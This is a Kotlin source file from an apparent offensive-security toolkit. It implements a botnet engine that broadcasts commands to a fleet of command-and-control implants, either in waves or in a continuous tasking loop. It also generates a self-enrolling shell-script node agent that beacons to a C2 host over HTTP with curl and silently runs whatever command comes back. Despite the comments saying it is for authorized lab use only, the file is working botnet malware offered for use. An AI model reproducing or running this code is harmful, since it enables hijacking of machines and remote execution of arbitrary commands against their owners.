package com.projectzerodays.quantumcli.ops

import com.projectzerodays.quantumcli.QuantumApp
import com.projectzerodays.quantumcli.c2.C2State
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

/**
 * Botnet engine — server side drives the existing C2 implant fleet in
 * synchronized waves (the implant registry + task queue ARE the botnet
 * control plane); client side generates a fleet-node agent script.
 * Authorized lab/engagement use only.
 */
object Botnet {

    data class Wave(val ts: String, val cmd: String, val hosts: Int, val acks: Int)

    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running.asStateFlow()

    private val _waves = MutableStateFlow<List<Wave>>(emptyList())
    val waves: StateFlow<List<Wave>> = _waves.asStateFlow()

    private val stopFlag = AtomicBoolean(false)
    private val ackCounter = AtomicLong(0)

    /** Fleet size — every enrolled implant. */
    fun fleetSize(): Int = C2State.implants.value.size

    /** Broadcast one command to the entire fleet via the task queue. */
    fun broadcast(cmd: String): Wave {
        val hosts = fleetSize()
        C2State.setTaskAll { JSONObject().put("act", "run").put("cmd", cmd) }
        val w = Wave(java.time.Instant.now().toString().take(19), cmd, hosts, 0)
        _waves.value = (_waves.value + w).takeLast(100)
        C2State.audit("BOTNET", "wave broadcast to $hosts node(s): ${cmd.take(80)}")
        return w
    }

    /**
     * Continuous tasking loop — pushes [cmd] every [intervalSec] until
     * [stop]. Acks are counted from beacon task pulls (implants that
     * received the task).
     */
    fun startLoop(cmd: String, intervalSec: Int, scope: kotlinx.coroutines.CoroutineScope = QuantumApp.appScope) {
        if (_running.value) return
        stopFlag.set(false)
        _running.value = true
        scope.launch(Dispatchers.IO) {
            while (isActive && !stopFlag.get()) {
                val before = C2State.implants.value.values.sumOf { it.beacons }
                broadcast(cmd)
                kotlinx.coroutines.delay(intervalSec * 1000L)
                val after = C2State.implants.value.values.sumOf { it.beacons }
                ackCounter.addAndGet((after - before).toLong())
            }
            _running.value = false
            C2State.audit("BOTNET", "tasking loop stopped (acks=${ackCounter.get()})")
        }
    }

    fun stop() {
        stopFlag.set(true)
    }

    /** Fleet node agent — self-enrolling GHOSTFANG variant that joins via HTTP beaconing. */
    fun nodeAgent(c2HostPort: String): String = """
#!/bin/sh
# QUANTUM botnet fleet node — authorized lab only
H=$(hostname 2>/dev/null || echo node-$(id -u))
J=0
while :; do
  R=$(curl -s -m 10 -X POST http://$c2HostPort/r \
       -H 'Content-Type: application/json' \
       -d "{\"host\":\"${'$'}H\",\"act\":\"hb\",\"os\":\"$(uname -s 2>/dev/null || echo ?)\"}" 2>/dev/null)
  C=$(echo "${'$'}R" | sed -n 's/.*"cmd":"\([^"]*\)".*/\1/p')
  if [ -n "${'$'}C" ]; then
    J=$((J+1))
    (sh -c "${'$'}C" >/dev/null 2>&1 &)
  fi
  sleep ${'$'}{BOT_INTERVAL:-60}
done
""".trimIndent() + "\n"
}
